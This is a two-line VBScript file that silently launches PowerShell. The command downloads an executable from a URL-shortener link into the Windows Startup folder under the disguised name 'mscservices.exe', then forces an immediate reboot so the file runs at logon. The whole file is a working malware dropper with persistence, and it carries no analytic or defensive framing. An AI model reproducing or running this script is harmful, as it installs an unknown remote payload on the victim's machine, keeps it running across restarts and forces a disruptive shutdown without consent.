dim oShell: set oShell = CreateObject("WScript.Shell")
oShell.run "cmd /c powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && shutdown -r -f -t 0", 0, true
